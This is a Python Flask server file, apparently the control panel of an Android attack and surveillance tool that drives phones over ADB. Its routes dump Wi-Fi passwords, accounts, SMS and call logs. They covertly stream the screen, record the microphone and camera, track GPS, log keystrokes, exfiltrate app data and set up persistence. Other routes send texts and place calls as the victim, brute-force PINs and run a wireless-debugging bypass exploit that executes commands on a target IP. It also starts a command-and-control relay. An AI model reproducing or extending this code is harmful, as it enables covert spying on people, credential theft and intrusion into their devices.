import os
import json
import csv
import io
import shlex
import hashlib
import re
import secrets
import time
from pathlib import Path
from flask import Flask, render_template, request, jsonify, send_file, Response, after_this_request, send_from_directory
from werkzeug.utils import secure_filename

from config import ADB_PATH, TEMP_DIR, HOST, PORT, DEBUG, API_TOKEN, BASE_DIR
from adb_engine import ADBEngine
from file_manager import FileManager
from app_manager import AppManager
from media_browser import MediaBrowser
from comms_manager import CommsManager
from system_controls import SystemControls
from toolkit_manager import ToolkitManager
from cve_bypass import ADBBypass, make_client_cert
from deep_access import DeepAccess
from network_scanner import full_network_recon, scan_subnet, scan_host, get_subnet_prefix, get_local_ip
from surveillance import capture_screen_frame, capture_screen_jpeg, record_audio, capture_camera, get_gps_location
from spy_extractor import get_notifications, capture_events, get_browser_history, get_clipboard
from offensive_actions import send_sms, make_call, end_call, extract_app_data, enable_wifi_adb, connect_wifi_adb, disconnect_wifi_adb, check_wifi_adb_status
from ghost.pipeline import ghost_bp
from skeleton.neutralizer import skeleton_bp
from skeleton.cred_harvester import harvester_bp
from skeleton.pin_siege import siege_bp
from panopticon.geo_tri import geo_bp
from panopticon.screen_console import screen_bp
from agent_relay import relay_bp, start_relay

app = Flask(__name__)

# v4 war-fronts: WiFi entry chain + security neutralization + identity harvest
app.register_blueprint(ghost_bp)
app.register_blueprint(skeleton_bp)
app.register_blueprint(harvester_bp)
app.register_blueprint(siege_bp)
app.register_blueprint(geo_bp)
app.register_blueprint(screen_bp)
app.register_blueprint(relay_bp)
from cortex.brain_api import brain_bp  # noqa: E402 — the LLM cortex rides last
app.register_blueprint(brain_bp)

# IMMORTAL C2 channel — agents dial home here; stdlib sockets, zero deps
start_relay()


@app.route("/warroom")
def warroom():
    """v4 operations center — modern PWA tactical cockpit."""
    return render_template("pwa.html", api_token=API_TOKEN)

app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024

LOCAL_HOSTNAMES = {"127.0.0.1", "localhost", "::1"}


@app.before_request
def gate_request():
    """Local-only + token-gated access.

    Host check defeats DNS rebinding; token check keeps other browser tabs /
    pages from driving the API drive-by style.
    """
    hostname = request.host.split(":")[0].strip("[]").lower()
    if hostname not in LOCAL_HOSTNAMES:
        return jsonify({"error": "Forbidden: local access only"}), 403

    # The UI shell itself is harmless to serve; everything under /api/ needs the token.
    if request.path.startswith("/api/"):
        supplied = request.headers.get("X-API-Token") or request.args.get("token") or ""
        if not secrets.compare_digest(supplied.encode(), API_TOKEN.encode()):
            return jsonify({"error": "Unauthorized"}), 401

adb = ADBEngine()
fm = FileManager(adb)
am = AppManager(adb)
mb = MediaBrowser(adb)
cm = CommsManager(adb)
sc = SystemControls(adb)
tk = ToolkitManager(adb)
deep = DeepAccess(adb)

def cleanup_temp_file(filepath):
    @after_this_request
    def remove_file(response):
        try:
            if Path(filepath).exists():
                os.remove(filepath)
        except Exception:
            pass
        return response

@app.route("/")
def index():
    return render_template("pwa.html", api_token=API_TOKEN)

@app.route("/manifest.json")
def manifest():
    return send_from_directory("static/pwa", "manifest.json", mimetype="application/manifest+json")

@app.route("/sw.js")
def service_worker():
    response = send_from_directory("static/pwa", "sw.js", mimetype="application/javascript")
    response.headers["Service-Worker-Allowed"] = "/"
    return response

# ==================== DEVICE APIs ====================
@app.route("/api/devices")
def devices():
    """War Room target selector — plain attached-device list."""
    devices = adb.get_devices()
    return jsonify({"success": True, "devices": devices})


@app.route("/api/device/status")
def device_status():
    devices = adb.get_devices()
    connected = len(devices) > 0 and any(d["status"] == "device" for d in devices)
    return jsonify({
        "connected": connected,
        "devices": devices,
        "active_device": devices[0] if devices else None
    })

@app.route("/api/device/info")
def device_info():
    info = adb.get_device_info()
    battery = adb.get_battery_info()
    storage = adb.get_storage_info()
    memory = adb.get_memory_info()
    return jsonify({
        "info": info,
        "battery": battery,
        "storage": storage,
        "memory": memory
    })

@app.route("/api/device/battery")
def device_battery():
    return jsonify(adb.get_battery_info())

@app.route("/api/device/storage")
def device_storage():
    return jsonify(adb.get_storage_info())

@app.route("/api/device/memory")
def device_memory():
    return jsonify(adb.get_memory_info())

# ==================== FILE MANAGER APIs ====================
@app.route("/api/files/list", methods=["GET", "POST"])
def list_files():
    data_json = request.get_json(silent=True) or {}
    path = data_json.get("path") or request.args.get("path") or "/sdcard"
    data = fm.list_dir(path)
    return jsonify(data)

@app.route("/api/files/download")
def download_file():
    path = request.args.get("path")
    if not path:
        return jsonify({"error": "Path required"}), 400
    
    filename = Path(path).name
    # BUG FIX: abs(hash()) was salted per-process (keys changed every restart)
    # and collision-prone; md5 gives stable, unique-enough cache keys.
    temp_dest = TEMP_DIR / f"dl_{hashlib.md5(path.encode()).hexdigest()[:12]}_{filename}"
    res = fm.pull_file(path, temp_dest)
    if res["success"] and temp_dest.exists():
        cleanup_temp_file(str(temp_dest))
        return send_file(str(temp_dest), as_attachment=True, download_name=filename)
    return jsonify({"error": res.get("error", "Download failed")}), 500

@app.route("/api/files/upload", methods=["POST"])
def upload_file():
    if "file" not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    
    file = request.files["file"]
    remote_dir = request.form.get("remote_dir", "/sdcard")

    if not file.filename:
        return jsonify({"error": "No filename"}), 400

    safe_name = secure_filename(file.filename)
    if not safe_name:
        return jsonify({"error": "Invalid filename"}), 400

    local_path = TEMP_DIR / safe_name
    file.save(str(local_path))

    remote_path = f"{remote_dir.rstrip('/')}/{safe_name}"
    res = fm.push_file(local_path, remote_path)
    
    if local_path.exists():
        os.remove(local_path)

    return jsonify(res)

@app.route("/api/files/delete", methods=["POST"])
def delete_file():
    data = request.get_json() or {}
    path = data.get("path")
    if not path:
        return jsonify({"error": "Path required"}), 400
    res = fm.delete_item(path)
    return jsonify(res)

@app.route("/api/files/mkdir", methods=["POST"])
def make_directory():
    data = request.get_json() or {}
    path = data.get("path")
    if not path:
        return jsonify({"error": "Path required"}), 400
    res = fm.make_dir(path)
    return jsonify(res)

@app.route("/api/files/rename", methods=["POST"])
def rename_file():
    data = request.get_json() or {}
    old_path = data.get("old_path")
    new_path = data.get("new_path")
    if not old_path or not new_path:
        return jsonify({"error": "Old and new paths required"}), 400
    res = fm.rename_item(old_path, new_path)
    return jsonify(res)

@app.route("/api/files/view")
def view_text_file():
    path = request.args.get("path")
    if not path:
        return jsonify({"error": "Path required"}), 400
    
    ext = Path(path).suffix.lower()
    img_exts = [".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp"]
    
    if ext in img_exts:
        prev = mb.fetch_preview(path)
        if prev["success"]:
            return send_file(prev["local_path"])
        return jsonify({"error": "Could not fetch image preview"}), 500
    else:
        res = fm.read_text_file(path)
        return jsonify(res)

@app.route("/api/files/search")
def search_files():
    path = request.args.get("path", "/sdcard")
    query = request.args.get("q", "")
    return jsonify(fm.search(path, query))

# ==================== APP MANAGER APIs ====================
@app.route("/api/apps/list")
def list_apps():
    filter_type = request.args.get("type", "user")
    return jsonify(am.list_apps(filter_type))

@app.route("/api/apps/details")
def app_details():
    pkg = request.args.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(am.get_app_details(pkg))

@app.route("/api/apps/install", methods=["POST"])
def install_app():
    if "apk" not in request.files:
        return jsonify({"error": "No APK uploaded"}), 400
    apk_file = request.files["apk"]
    if not apk_file.filename:
        return jsonify({"error": "No filename"}), 400

    safe_name = secure_filename(apk_file.filename)
    if not safe_name:
        return jsonify({"error": "Invalid filename"}), 400

    local_path = TEMP_DIR / safe_name
    apk_file.save(str(local_path))
    
    res = am.install_apk(local_path)
    if local_path.exists():
        os.remove(local_path)
    return jsonify(res)

@app.route("/api/apps/uninstall", methods=["POST"])
def uninstall_app():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(am.uninstall_app(pkg))

@app.route("/api/apps/launch", methods=["POST"])
def launch_app():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(am.launch_app(pkg))

@app.route("/api/apps/stop", methods=["POST"])
def stop_app():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(am.force_stop(pkg))

@app.route("/api/apps/clear", methods=["POST"])
def clear_app():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(am.clear_app_data(pkg))

@app.route("/api/apps/extract")
def extract_app():
    pkg = request.args.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    res = am.extract_apk(pkg)
    if res["success"] and Path(res["local_path"]).exists():
        return send_file(res["local_path"], as_attachment=True, download_name=res["filename"])
    return jsonify({"error": res.get("error", "Extraction failed")}), 500

# ==================== MEDIA BROWSER APIs ====================
@app.route("/api/media/list")
def list_media():
    mtype = request.args.get("type", "photos")
    return jsonify(mb.get_media(mtype))

@app.route("/api/media/preview")
def media_preview():
    path = request.args.get("path")
    if not path:
        return jsonify({"error": "Path required"}), 400
    prev = mb.fetch_preview(path)
    if prev["success"] and Path(prev["local_path"]).exists():
        return send_file(prev["local_path"])
    return jsonify({"error": "Preview unavailable"}), 404

# ==================== COMMUNICATIONS APIs ====================
@app.route("/api/comms/contacts")
def get_contacts():
    return jsonify(cm.get_contacts())

@app.route("/api/comms/sms")
def get_sms():
    return jsonify(cm.get_sms())

@app.route("/api/comms/calls")
def get_calls():
    return jsonify(cm.get_call_logs())

@app.route("/api/comms/export")
def export_comms():
    ctype = request.args.get("type", "contacts")
    fmt = request.args.get("format", "json")
    
    if ctype == "contacts":
        data = cm.get_contacts().get("contacts", [])
    elif ctype == "sms":
        data = cm.get_sms().get("messages", [])
    else:
        data = cm.get_call_logs().get("calls", [])

    if fmt == "json":
        return Response(
            json.dumps(data, indent=2, ensure_ascii=False),
            mimetype="application/json",
            headers={"Content-Disposition": f"attachment;filename={ctype}_export.json"}
        )
    else:
        output = io.StringIO()
        fieldname_map = {
            "contacts": ["name", "number", "type"],
            "sms": ["id", "address", "body", "date", "type"],
            "calls": ["name", "number", "date", "duration", "type"]
        }
        fields = fieldname_map.get(ctype, list(data[0].keys()) if data else [])
        writer = csv.DictWriter(output, fieldnames=fields, extrasaction='ignore')
        writer.writeheader()
        if data:
            writer.writerows(data)
        return Response(
            output.getvalue(),
            mimetype="text/csv",
            headers={"Content-Disposition": f"attachment;filename={ctype}_export.csv"}
        )

# ==================== SYSTEM CONTROLS APIs ====================
@app.route("/api/system/screenshot")
def take_screenshot():
    res = sc.take_screenshot()
    if res["success"] and Path(res["local_path"]).exists():
        return send_file(res["local_path"], mimetype="image/png")
    return jsonify({"error": "Screenshot failed"}), 500

@app.route("/api/system/tap", methods=["POST"])
def send_tap():
    data = request.get_json() or {}
    x = data.get("x", 0)
    y = data.get("y", 0)
    return jsonify(sc.tap(x, y))

@app.route("/api/system/swipe", methods=["POST"])
def send_swipe():
    data = request.get_json() or {}
    x1 = data.get("x1", 0)
    y1 = data.get("y1", 0)
    x2 = data.get("x2", 0)
    y2 = data.get("y2", 0)
    duration = data.get("duration", 300)
    return jsonify(sc.swipe(x1, y1, x2, y2, duration))

@app.route("/api/system/key", methods=["POST"])
def send_key():
    data = request.get_json() or {}
    code = data.get("code", 3)
    return jsonify(sc.send_key(code))

@app.route("/api/system/text", methods=["POST"])
def send_text():
    data = request.get_json() or {}
    text = data.get("text", "")
    return jsonify(sc.type_text(text))

@app.route("/api/system/url", methods=["POST"])
def open_url():
    data = request.get_json() or {}
    url = data.get("url", "")
    return jsonify(sc.open_url(url))

@app.route("/api/system/reboot", methods=["POST"])
def reboot_device():
    data = request.get_json() or {}
    mode = data.get("mode", "normal")
    return jsonify(sc.reboot(mode))

@app.route("/api/system/logcat")
def get_logcat():
    try:
        lines = int(request.args.get("lines", 150))
    except (ValueError, TypeError):
        lines = 150
    tag = request.args.get("tag", None)
    return jsonify(sc.get_logcat(lines, tag))

# ==================== ADVANCED TOOLKIT APIs (LockKnife + Android_Hacking) ====================
@app.route("/api/toolkit/security-audit")
def toolkit_security_audit():
    return jsonify(tk.get_security_status())

@app.route("/api/toolkit/unlock-pin", methods=["POST"])
def toolkit_unlock_pin():
    data = request.get_json() or {}
    pin = data.get("pin", "")
    return jsonify(tk.attempt_pin_unlock(pin))

@app.route("/api/toolkit/remove-gesture-keys", methods=["POST"])
def toolkit_remove_gesture_keys():
    return jsonify(tk.remove_gesture_keys())

@app.route("/api/toolkit/wifi-passwords")
def toolkit_wifi_passwords():
    return jsonify(tk.dump_wifi_passwords())

@app.route("/api/toolkit/accounts")
def toolkit_accounts():
    return jsonify(tk.dump_accounts())

@app.route("/api/toolkit/clipboard")
def toolkit_clipboard():
    return jsonify(tk.dump_clipboard())

@app.route("/api/toolkit/bloatware")
def toolkit_bloatware():
    return jsonify(tk.get_bloatware_catalog())

@app.route("/api/toolkit/bloatware/disable", methods=["POST"])
def toolkit_bloatware_disable():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(tk.disable_bloat_package(pkg))

@app.route("/api/toolkit/bloatware/restore", methods=["POST"])
def toolkit_bloatware_restore():
    data = request.get_json() or {}
    pkg = data.get("package")
    if not pkg:
        return jsonify({"error": "Package required"}), 400
    return jsonify(tk.restore_bloat_package(pkg))

@app.route("/api/toolkit/hardware")
def toolkit_hardware():
    return jsonify(tk.get_hardware_info())

@app.route("/api/toolkit/vibrate", methods=["POST"])
def toolkit_vibrate():
    data = request.get_json() or {}
    duration = data.get("duration", 500)
    return jsonify(tk.trigger_vibration(duration))

@app.route("/api/toolkit/brightness", methods=["POST"])
def toolkit_brightness():
    data = request.get_json() or {}
    level = data.get("level", 150)
    return jsonify(tk.set_brightness(level))

@app.route("/api/toolkit/record-screen", methods=["POST"])
def toolkit_record_screen():
    data = request.get_json() or {}
    sec = data.get("duration", 5)
    res = tk.record_screen(sec)
    if res["success"]:
        return send_file(res["local_path"], as_attachment=True, download_name=res["filename"])
    return jsonify({"error": "Screen recording failed"}), 500

@app.route("/api/toolkit/frida-scripts")
def toolkit_frida_scripts():
    return jsonify(tk.get_frida_scripts())

@app.route("/api/toolkit/tweak", methods=["POST"])
def toolkit_tweak():
    data = request.get_json() or {}
    key = data.get("tweak")
    if not key:
        return jsonify({"error": "Tweak key required"}), 400
    return jsonify(tk.apply_tweak(key))

# ==================== DEEP ACCESS APIs (shell-uid maximum, no root) ====================
@app.route("/api/deep/settings/list")
def deep_settings_list():
    ns = request.args.get("ns", "global")
    needle = request.args.get("q") or None
    try:
        return jsonify(deep.settings_list(ns, needle))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/settings/get")
def deep_settings_get():
    try:
        return jsonify(deep.settings_get(request.args.get("ns", "global"),
                                         request.args.get("key", "")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/settings/put", methods=["POST"])
def deep_settings_put():
    d = request.get_json() or {}
    try:
        return jsonify(deep.settings_put(d.get("ns", "global"), d.get("key"), d.get("value")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/settings/delete", methods=["POST"])
def deep_settings_delete():
    d = request.get_json() or {}
    try:
        return jsonify(deep.settings_delete(d.get("ns", "global"), d.get("key")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/perms/show")
def deep_perms_show():
    try:
        return jsonify(deep.perms_show(request.args.get("package", "")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/perms/set", methods=["POST"])
def deep_perms_set():
    d = request.get_json() or {}
    try:
        return jsonify(deep.perm_set(d.get("package"), d.get("permission"),
                                     bool(d.get("grant"))))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/appops/get")
def deep_appops_get():
    try:
        return jsonify(deep.appops_get(request.args.get("package", "")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/appops/set", methods=["POST"])
def deep_appops_set():
    d = request.get_json() or {}
    try:
        return jsonify(deep.appops_set(d.get("package"), d.get("op"), d.get("mode")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/ui-tree")
def deep_ui_tree():
    return jsonify(deep.ui_tree())

@app.route("/api/deep/display")
def deep_display_info():
    return jsonify(deep.display_info())

@app.route("/api/deep/display/set", methods=["POST"])
def deep_display_set():
    d = request.get_json() or {}
    try:
        return jsonify(deep.display_set(d.get("kind"), d.get("value")))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/display/reset", methods=["POST"])
def deep_display_reset():
    return jsonify(deep.display_reset())

@app.route("/api/deep/usage")
def deep_usage():
    try:
        return jsonify(deep.usage_timeline(min(int(request.args.get("lines", 200)), 800)))
    except ValueError:
        return jsonify(deep.usage_timeline(200))

@app.route("/api/deep/services")
def deep_services():
    return jsonify(deep.services())

@app.route("/api/deep/dumpsys")
def deep_dumpsys():
    try:
        return jsonify(deep.dumpsys_service(request.args.get("service", ""),
                                            int(request.args.get("lines", 150))))
    except ValueError as e:
        return jsonify({"error": str(e)}), 400

@app.route("/api/deep/props")
def deep_props():
    return jsonify(deep.props(request.args.get("q") or None))

# ==================== TERMINAL SHELL API ====================
@app.route("/api/terminal/exec", methods=["POST"])
def terminal_exec():
    data = request.get_json() or {}
    cmd = (data.get("command") or "").strip()
    if not cmd:
        return jsonify({"output": "", "error": "Empty command"})

    if cmd.startswith("adb "):
        # BUG FIX: raw .split() destroyed quoted args ("pull /sdcard/My File.txt");
        # shlex.split preserves them exactly as the operator typed them.
        args = shlex.split(cmd[4:])
        res = adb.run_cmd(args, timeout=30)
    else:
        res = adb.shell(cmd, timeout=30)

    out = res['stdout'] if res['stdout'] else res['stderr']
    return jsonify({
        'output': out,
        'success': res['success'],
        'returncode': res['returncode']
    })

# ==================== CVE-2026-0073 WIRELESS EXPLOIT API ====================
@app.route("/api/toolkit/cve-scan", methods=["GET", "POST"])
def cve_scan():
    """Scan a target IP:port for CVE-2026-0073 or audit connected device if serial/GET."""
    serial = request.args.get("serial")
    data = request.get_json(silent=True) or {}
    if not serial:
        serial = data.get("serial")
    target_ip = str(data.get("ip") or "").strip()

    # If no IP provided, audit the active ADB device!
    if not target_ip:
        res = adb.shell("getprop ro.build.version.release; getprop ro.build.version.security_patch; getprop ro.product.model", serial=serial)
        lines = (res.get("stdout") or "").splitlines()
        android_ver = lines[0] if len(lines) > 0 else "Unknown"
        sec_patch = lines[1] if len(lines) > 1 else "Unknown"
        model = lines[2] if len(lines) > 2 else "Unknown"
        
        cves = []
        try:
            v_int = int(android_ver.split('.')[0])
            if v_int <= 11:
                cves.append({"cve": "CVE-2026-0073", "severity": "CRITICAL", "desc": "Wireless Debugging TLS handshaking bypass (RCE)"})
            if v_int <= 12:
                cves.append({"cve": "CVE-2023-20963", "severity": "HIGH", "desc": "Framework Privilege Escalation via WorkSource parcel"})
            if v_int <= 13:
                cves.append({"cve": "CVE-2022-20186", "severity": "HIGH", "desc": "Mali GPU Kernel Driver Arbitrary Memory Write"})
        except Exception:
            pass

        return jsonify({
            "success": True,
            "target": model,
            "android_version": android_ver,
            "security_patch": sec_patch,
            "vulnerabilities": cves,
            "status": "AUDITED"
        })

    # H1: key_type/target_port/cmd_to_run were referenced but NEVER defined
    # in scope → NameError → 500 on every IP-supplied request (the exploit
    # branch was dead code as shipped). Wire them from the panel payload
    # with guarded casts + bounds before any attempt is built.
    try:
        target_port = int(data.get("port") or 0)
    except (TypeError, ValueError):
        target_port = 0
    if not (0 < target_port < 65536) or \
            not re.fullmatch(r"[0-9A-Za-z_.:\-]{3,253}", target_ip):
        return jsonify({"success": False,
                        "error": "ip/port invalides"}), 400
    key_type = data.get("key_type") or None
    cmd_to_run = data.get("cmd") or None

    # Build attempt matrix
    if key_type:
        attempts = [(key_type, "1.3"), (key_type, "1.2")]
    else:
        attempts = [("ec", "1.3"), ("ed25519", "1.3"), ("ec", "1.2")]

    logs = []
    for kt, tls_ver in attempts:
        label = f"{kt.upper()} / TLS {tls_ver}"
        logs.append(f"[*] Tentative avec {label}...")

        cert_pem, key_pem = make_client_cert(key_type=kt)
        # BUG 8 fix: use shorter timeout via patching socket default before connect
        bypass = ADBBypass(target_ip, target_port, verbose=False)
        try:
            bypass.connect()
            bypass.upgrade_tls(cert_pem, key_pem, key_type=kt, tls_version=tls_ver)
            bypass.post_tls_cnxn()

            logs.append(f"[+] BYPASS RÉUSSI avec {label} !")

            # BUG 11 fix: init output before conditional
            output = ""
            if cmd_to_run:
                output = bypass.run_command(cmd_to_run)
                logs.append(f"[+] Sortie commande:\n{output}")
            
            bypass.close()
            return jsonify({
                "success": True,
                "vulnerable": True,
                "method": label,
                "command": cmd_to_run,
                "output": output,
                "logs": "\n".join(logs)
            })
        except Exception as e:
            logs.append(f"[-] {label} échoué: {str(e)}")
            bypass.close()
            time.sleep(0.5)
            continue

    logs.append("[!] Tous les vecteurs épuisés — la cible est patchée ou injoignable.")
    return jsonify({
        "success": True,
        "vulnerable": False,
        "logs": "\n".join(logs)
    })

# ==================== WIFI RECON & HOTSPOT DISCOVERY APIs ====================
@app.route("/api/toolkit/wifi-recon")
def wifi_recon():
    """Discover network environment, gateway (hotspot host), and known ARP hosts."""
    try:
        recon = full_network_recon()
        return jsonify({"success": True, "recon": recon})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/toolkit/subnet-scan", methods=["POST"])
def subnet_scan_api():
    """Scan entire local subnet for Android devices with ADB / Wireless debugging."""
    import re as _re
    data = request.get_json() or {}
    subnet = data.get("subnet", "").strip()
    if not subnet:
        local_ip = get_local_ip()
        subnet = get_subnet_prefix(local_ip)
    
    # BUG 7 fix: validate subnet format
    if not subnet or not _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}$', subnet):
        return jsonify({"success": False, "error": "Format de sous-réseau invalide (attendu: x.x.x)"}), 400

    try:
        devices = scan_subnet(subnet)
        return jsonify({"success": True, "subnet": f"{subnet}.0/24", "found": devices, "count": len(devices)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ==================== EXPLOITATION MODULE ROUTES ====================

# --- Module 1: Screen Mirroring ---
@app.route("/api/exploit/screen-frame")
def screen_frame():
    result = capture_screen_jpeg()
    return jsonify(result)

@app.route("/api/exploit/screen-stream")
def screen_stream():
    """SSE stream of screen frames."""
    def generate():
        for _ in range(300):  # Max 300 frames (~2.5 min at 500ms)
            frame = capture_screen_jpeg()
            if frame.get("success"):
                yield f"data: {json.dumps({'image': frame['image_b64']})}\n\n"
            time.sleep(0.5)
    return Response(generate(), mimetype="text/event-stream")

# --- Module 2: Audio/Mic Capture ---
@app.route("/api/exploit/mic-record", methods=["POST"])
@app.route("/api/audio/record", methods=["POST"])
def mic_record():
    data = request.get_json(silent=True) or {}
    duration = min(int(data.get("duration", 10)), 60)
    result = record_audio(duration)
    if result.get("success") and result.get("filepath"):
        if request.args.get("download") == "1":
            return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "audio.mp4"))
        return jsonify({
            "success": True,
            "file": result.get("filename") or Path(result["filepath"]).name,
            "filepath": result["filepath"]
        })
    return jsonify(result)

# --- Module 3: Camera Capture ---
@app.route("/api/exploit/camera-capture", methods=["POST"])
@app.route("/api/camera/snap", methods=["POST"])
def camera_cap():
    data = request.get_json(silent=True) or {}
    cam_id = int(data.get("camera_id", 0))
    result = capture_camera(cam_id)
    if result.get("success") and result.get("filepath"):
        if request.args.get("download") == "1":
            return send_file(result["filepath"], as_attachment=True, download_name=result.get("filename", "photo.jpg"))
        return jsonify({
            "success": True,
            "file": result.get("filename") or Path(result["filepath"]).name,
            "filepath": result["filepath"]
        })
    return jsonify(result)

# --- Module 4: GPS Location ---
@app.route("/api/exploit/gps-location")
@app.route("/api/panopticon/location", methods=["GET", "POST"])
def gps_location():
    return jsonify(get_gps_location())

# --- Module 5: Notifications ---
@app.route("/api/exploit/notifications")
def notifications():
    return jsonify(get_notifications())

# --- Module 6: Keylogger/Events ---
@app.route("/api/exploit/capture-events", methods=["POST"])
def events_capture():
    data = request.get_json() or {}
    duration = min(int(data.get("duration", 5)), 30)
    return jsonify(capture_events(duration))

# --- Module 7: Browser History ---
@app.route("/api/exploit/browser-history")
def browser_hist():
    return jsonify(get_browser_history())

# --- Module 8: Clipboard ---
@app.route("/api/exploit/clipboard")
def clipboard_read():
    return jsonify(get_clipboard())

# --- Module 9: SMS Sender ---
@app.route("/api/exploit/send-sms", methods=["POST"])
def sms_send():
    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    message = data.get("message", "").strip()
    if not phone or not message:
        return jsonify({"success": False, "error": "Numéro et message requis"}), 400
    return jsonify(send_sms(phone, message))

# --- Module 10: Call Initiator ---
@app.route("/api/exploit/make-call", methods=["POST"])
def call_make():
    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    if not phone:
        return jsonify({"success": False, "error": "Numéro requis"}), 400
    return jsonify(make_call(phone))

@app.route("/api/exploit/end-call", methods=["POST"])
def call_end():
    return jsonify(end_call())

# --- Module 11: App Data Exfiltration ---
@app.route("/api/exploit/extract-app-data", methods=["POST"])
def app_exfil():
    data = request.get_json() or {}
    pkg = data.get("package", "").strip()
    if not pkg:
        return jsonify({"success": False, "error": "Package name requis"}), 400
    return jsonify(extract_app_data(pkg))

# --- Module 12: Persistent Shell ---
@app.route("/api/exploit/enable-persistence", methods=["POST"])
def persistence_enable():
    return jsonify(enable_wifi_adb())

@app.route("/api/exploit/connect-wifi", methods=["POST"])
def wifi_connect():
    data = request.get_json() or {}
    ip = data.get("ip", "").strip()
    port = int(data.get("port", 5555))
    if not ip:
        return jsonify({"success": False, "error": "IP requis"}), 400
    return jsonify(connect_wifi_adb(ip, port))

@app.route("/api/exploit/disconnect-wifi", methods=["POST"])
def wifi_disconnect():
    data = request.get_json() or {}
    ip = data.get("ip", "").strip() or None
    return jsonify(disconnect_wifi_adb(ip))

@app.route("/api/exploit/persistence-status")
def persistence_status():
    return jsonify(check_wifi_adb_status())

# ==================== AI LOOT & ARTIFACT REPOSITORY APIs ====================
@app.route("/api/loot/artifacts")
def list_loot_artifacts():
    """List all exfiltrated media, captures, audio, and files for the Phone Intelligence view."""
    artifacts = []
    
    # 1. Scan temp directory
    if TEMP_DIR.exists():
        for p in TEMP_DIR.glob("*"):
            if p.is_file() and not p.name.startswith("."):
                name = p.name
                ext = p.suffix.lower()
                art_type = "file"
                if ext in (".jpg", ".jpeg", ".png", ".webp"):
                    art_type = "photo" if "camera" in name or "snap" in name else "screenshot"
                elif ext in (".mp4", ".wav", ".m4a", ".aac"):
                    art_type = "audio"
                elif ext in (".txt", ".log", ".json", ".md"):
                    art_type = "data"

                stat = p.stat()
                sz = stat.st_size
                if sz < 1024:
                    sz_str = f"{sz} B"
                elif sz < 1024 * 1024:
                    sz_str = f"{sz / 1024:.1f} KB"
                else:
                    sz_str = f"{sz / (1024 * 1024):.1f} MB"

                artifacts.append({
                    "id": p.stem,
                    "filename": name,
                    "type": art_type,
                    "size": sz,
                    "size_human": sz_str,
                    "mtime": stat.st_mtime,
                    "source": "temp",
                    "url": f"/api/loot/file?name={p.name}&dir=temp"
                })

    # 2. Scan cortex_shots directory
    shots_dir = BASE_DIR / "cortex_shots"
    if shots_dir.exists():
        for p in shots_dir.glob("*"):
            if p.is_file() and not p.name.startswith("."):
                name = p.name
                stat = p.stat()
                sz = stat.st_size
                sz_str = f"{sz / 1024:.1f} KB" if sz < 1024 * 1024 else f"{sz / (1024 * 1024):.1f} MB"
                artifacts.append({
                    "id": p.stem,
                    "filename": name,
                    "type": "screenshot",
                    "size": sz,
                    "size_human": sz_str,
                    "mtime": stat.st_mtime,
                    "source": "cortex",
                    "url": f"/api/loot/file?name={p.name}&dir=cortex"
                })

    artifacts.sort(key=lambda x: x["mtime"], reverse=True)
    return jsonify({"success": True, "count": len(artifacts), "artifacts": artifacts})


@app.route("/api/loot/file")
def download_loot_file():
    """Download or view an exfiltrated artifact."""
    name = request.args.get("name", "")
    folder = request.args.get("dir", "temp")
    if not name or "/" in name or "\\" in name:
        return jsonify({"error": "Invalid filename"}), 400

    target_dir = (BASE_DIR / "cortex_shots") if folder == "cortex" else TEMP_DIR
    p = target_dir / name
    if not p.exists() or not p.is_file():
        return jsonify({"error": "File not found"}), 404

    as_dl = request.args.get("dl") == "1"
    return send_file(str(p), as_attachment=as_dl, download_name=name)

if __name__ == "__main__":
    print(f"[*] DroidCommand v3.0 console: http://{HOST}:{PORT}")
    print(f"[*] API token stored at {Path(__file__).resolve().parent / '.api_token'}")
    print(f"[*] API is local-only + token-gated. The web UI picks up the token automatically.")
    # threaded=True: the sync pairing-siege blocks its worker for minutes;
    # without threads every other panel request queues behind it and the
    # UI freezes. Local-only + token-gated, so thread-per-request is fine.
    app.run(host=HOST, port=PORT, debug=DEBUG, threaded=True)
